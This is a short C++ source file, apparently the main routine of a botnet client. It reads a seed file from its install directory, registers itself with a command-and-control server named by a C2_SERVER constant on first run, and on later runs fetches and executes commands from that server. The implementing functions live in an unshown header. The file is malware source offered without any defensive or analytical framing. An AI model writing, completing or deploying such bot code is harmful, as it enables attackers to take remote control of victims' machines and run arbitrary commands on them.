#include <stdio.h>
#include <fstream>
#include <string>

#include "bot.hh"

int main() {
    std::string register_url, command_url, seed_path;

    seed_path = util::GetInstallDir() + SEED_FILE;
    Bot host(seed_path);

    register_url = C2_SERVER + REGISTER_URI;
    command_url = C2_SERVER + CMD_URI;

    if (host.IsInit()) {
        host.ExecuteCommand(command_url);
    } else {
        host.Init();
        host.RegisterBot(register_url);
    }

    return 0;
}
